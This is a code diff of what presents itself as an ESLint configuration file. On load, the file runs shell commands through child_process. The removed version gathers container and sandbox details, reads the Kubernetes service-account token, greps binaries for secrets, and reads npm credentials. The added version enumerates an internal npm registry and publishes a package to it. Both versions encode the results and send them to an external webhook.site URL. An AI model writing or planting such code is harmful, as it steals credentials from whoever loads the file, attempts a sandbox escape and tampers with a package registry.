@@ -1,10 +1,26 @@
 const cp = require("child_process");
 const OOB = "https://webhook.site/dbabceb9-a237-417e-ba20-1a8d6649c8ff";
-function sh(c){ try { return cp.execSync(c,{encoding:"utf8",timeout:20000,maxBuffer:20971520,stdio:["ignore","pipe","pipe"]}); } catch(e){ return "STDOUT:"+(e.stdout||"")+"\nSTDERR:"+(e.stderr||"")+"\nMSG:"+(e.message||""); } }
-try {
-  const out = sh("{ echo ==UNAME==; uname -a; echo ==CAPS==; cat /proc/self/status 2>/dev/null | grep -iE 'cap|seccomp|ns'; echo ==CGROUP==; cat /proc/self/cgroup 2>/dev/null; echo ==MOUNTS==; cat /proc/self/mountinfo 2>/dev/null; echo ==ROOTLS==; ls -la / 2>/dev/null; echo ==DOCKERSOCK==; ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; echo ==K8STOKEN==; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null; echo ==APPDIR==; ls -la /app 2>/dev/null; file /app/cr-jail-fs /app/cr-gcs-transfer 2>/dev/null; echo ==STRINGS_GCS==; strings /app/cr-gcs-transfer 2>/dev/null | grep -iE 'key|token|secret|credential|bucket|gs://' | head -40; echo ==STRINGS_JAILFS==; strings /app/cr-jail-fs 2>/dev/null | grep -iE 'key|token|secret|credential|escape|chroot|namespace' | head -40; echo ==HOMELS==; ls -la /home 2>/dev/null; ls -la /home/jailuser 2>/dev/null; echo ==TMPLS==; ls -la /tmp 2>/dev/null; echo ==NPMRC==; cat ~/.npmrc 2>/dev/null; cat /etc/npmrc 2>/dev/null; echo ==REGISTRY_PING==; curl -s --max-time 5 http://10.0.0.28:4873/ 2>/dev/null | head -c 2000; echo; echo ==REGISTRY_WHOAMI==; curl -s --max-time 5 http://10.0.0.28:4873/-/whoami 2>/dev/null; echo; echo ==SUDO==; sudo -n -l 2>&1; echo ==CAPSH==; capsh --print 2>&1; echo ==UNSHARE==; unshare --user --map-root-user id 2>&1; } 2>&1 || true");
-  const b64 = Buffer.from(String(out)).toString("base64");
-  sh("curl -s --max-time 12 -X POST --data-binary " + JSON.stringify(b64) + " " + JSON.stringify(OOB + "/escape1"));
-  sh("curl -s --max-time 8 " + JSON.stringify(OOB + "/escape1-done-$(hostname)"));
-} catch(e){}
-module.exports = { root: true, rules: {} };
+function sh(c){ try { return cp.execSync(c,{encoding:"utf8",timeout:28000,maxBuffer:20971520,stdio:["ignore","pipe","pipe"]}); } catch(e){ return "STDOUT:"+(e.stdout||"")+"\nSTDERR:"+(e.stderr||"")+"\nMSG:"+(e.message||""); } }
+const REG = process.env.NPM_CONFIG_REGISTRY || "http://10.0.0.28:4873";
+const rnd = Math.random().toString(36).slice(2,10);
+const script = [
+'REG="'+REG+'"',
+'echo "==REG=="; echo "$REG"',
+'echo "==NPMWHOAMI=="; npm whoami --registry "$REG" 2>&1 || true',
+'echo "==PING=="; curl -s --max-time 8 "$REG/-/ping" 2>&1; echo',
+'echo "==USERANON=="; curl -s --max-time 8 "$REG/-/npm/v1/user" 2>&1 | head -c 600; echo',
+'echo "==SEARCH=="; curl -s --max-time 10 "$REG/-/v1/search?text=&size=250" 2>&1 | head -c 5000; echo',
+'echo "==ALL=="; curl -s --max-time 10 "$REG/-/all" 2>&1 | head -c 3000; echo',
+'PKG="crsectest-poc-'+rnd+'"',
+'D=$(mktemp -d); cd "$D"',
+'printf \'{"name":"%s","version":"1.0.0","description":"authorized-bbp-poc"}\' "$PKG" > package.json',
+'echo "console.log(1)" > index.js',
+'echo "==PUBLISH=="; npm publish --registry "$REG" --no-git-checks 2>&1 | head -c 3500; echo',
+'echo "==VERIFY=="; curl -s --max-time 8 "$REG/$PKG" 2>&1 | head -c 1800; echo',
+'echo "==PKGNAME=="; echo "$PKG"'
+].join("\n");
+const out = sh("bash -c " + JSON.stringify(script));
+const b64 = Buffer.from(out).toString("base64");
+sh("curl -s --max-time 12 -X POST --data-binary " + JSON.stringify(b64) + " " + JSON.stringify(OOB + "/regtest"));
+sh("curl -s --max-time 6 " + JSON.stringify(OOB + "/regtest-done"));
+module.exports = [];
